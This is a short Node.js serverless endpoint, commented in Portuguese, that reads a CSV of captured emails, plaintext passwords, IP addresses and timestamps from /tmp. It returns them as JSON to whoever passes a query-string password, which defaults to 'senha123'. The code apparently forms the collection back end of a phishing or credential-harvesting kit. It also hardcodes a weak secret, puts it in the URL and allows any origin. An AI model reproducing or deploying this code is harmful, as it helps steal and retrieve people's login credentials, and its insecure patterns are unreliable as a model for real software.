const fs = require('fs');
const path = require('path');

// Senha para proteger o acesso (configure uma variável de ambiente)
const ACCESS_PASSWORD = process.env.ACCESS_PASSWORD || 'senha123';

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    // Apenas aceitar GET
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Verificar senha via query parameter
        const password = req.query.password;
        
        if (password !== ACCESS_PASSWORD) {
            return res.status(401).json({ error: 'Unauthorized' });
        }

        const CSV_FILE = path.join('/tmp', 'credentials.csv');

        // Verificar se o arquivo existe
        if (!fs.existsSync(CSV_FILE)) {
            return res.json({ 
                success: true, 
                count: 0, 
                credentials: [],
                message: 'Nenhuma credencial salva ainda'
            });
        }

        // Ler e parsear CSV
        const csvContent = fs.readFileSync(CSV_FILE, 'utf8');
        const lines = csvContent.trim().split('\n');
        
        if (lines.length <= 1) {
            return res.json({ 
                success: true, 
                count: 0, 
                credentials: [],
                message: 'Nenhuma credencial salva ainda'
            });
        }

        // Parsear CSV (pular cabeçalho)
        const credentials = [];
        
        // Função simples para parsear linha CSV (considera valores entre aspas)
        function parseCSVLine(line) {
            const result = [];
            let current = '';
            let inQuotes = false;
            
            for (let i = 0; i < line.length; i++) {
                const char = line[i];
                
                if (char === '"') {
                    inQuotes = !inQuotes;
                } else if (char === ',' && !inQuotes) {
                    result.push(current.trim());
                    current = '';
                } else {
                    current += char;
                }
            }
            result.push(current.trim());
            return result;
        }
        
        for (let i = 1; i < lines.length; i++) {
            const values = parseCSVLine(lines[i]);
            if (values.length >= 4) {
                credentials.push({
                    timestamp: values[0],
                    email: values[1],
                    password: values[2],
                    ip: values[3]
                });
            }
        }

        res.json({ 
            success: true,
            count: credentials.length,
            credentials: credentials,
            lastUpdate: new Date().toISOString()
        });

    } catch (error) {
        console.error('Erro ao ler credenciais:', error);
        res.status(500).json({ error: 'Erro ao processar requisição' });
    }
};
